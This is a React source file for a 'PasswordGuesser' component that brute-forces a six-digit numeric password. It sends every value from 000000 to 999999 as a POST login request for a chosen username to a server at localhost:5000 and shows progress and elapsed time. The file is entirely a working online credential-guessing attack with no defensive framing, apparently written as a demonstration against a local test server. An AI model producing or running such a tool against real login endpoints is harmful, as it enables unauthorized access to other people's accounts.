import React, { useState } from "react";
import axios from "axios";

const SERVER_URL = "http://localhost:5000/login";

const PasswordGuesser = () => {
  const [username, setUsername] = useState("");
  const [status, setStatus] = useState("");
  const [progress, setProgress] = useState(0);
  const [elapsedTime, setElapsedTime] = useState(0);
  const [intervalId, setIntervalId] = useState(null);

  const handleUsernameChange = (event) => {
    setUsername(event.target.value);
  };

  const guessPassword = async () => {
    const startTime = Date.now();
    let attempts = 0;

    for (let i = 0; i <= 999999; i++) {
      const password = i.toString().padStart(6, "0");

      try {
        const response = await axios.post(SERVER_URL, { username, password });
        attempts++;

        if (response.data.result === "success") {
          clearInterval(intervalId);
          setStatus(`Password found: ${password}`);
          setProgress(100);
          setElapsedTime((Date.now() - startTime) / 1000);
          return;
        }

        setProgress(((i / 999999) * 100).toFixed(2));
      } catch (error) {
        console.error(error);
      }
    }

    setStatus("Password not found.");
    setElapsedTime((Date.now() - startTime) / 1000);
  };

  const startGuessing = () => {
    setStatus("Guessing...");
    setProgress(0);
    setElapsedTime(0);

    const id = setInterval(() => {
      setElapsedTime((prevTime) => prevTime + 1);
    }, 1000);
    setIntervalId(id);

    guessPassword();
  };

  return (
    <div>
      <input
        type="text"
        value={username}
        onChange={handleUsernameChange}
        placeholder="Enter username"
      />
      <button onClick={startGuessing}>Start Guessing</button>
      <div>Status: {status}</div>
      <div>Progress: {progress}%</div>
      <div>Elapsed Time: {elapsedTime} seconds</div>
    </div>
  );
};

export default PasswordGuesser;
